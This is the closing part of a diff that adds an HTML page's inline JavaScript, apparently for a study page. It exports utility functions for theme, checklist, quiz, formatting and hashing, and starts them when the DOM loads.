+    initTheme,
+    toggleTheme,
+    initChecklist,
+    isStudyDone,
+    setStudyDone,
+    initQuiz,
+    checkQuiz,
+    copyCode,
+    escapeHtml,
+    formatBytes,
+    formatNumber,
+    bytesToHex,
+    hexToBytes,
+    sha256Hex,
+  };
+
+  // Auto-inicialização na carga do DOM
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', () => {
+      initTheme();
+      initChecklist();
+      initQuiz();
+    });
+  } else {
+    initTheme();
+    initChecklist();
+    initQuiz();
+  }
+})(window, document);
+
+  </script>
+</body>
+</html>
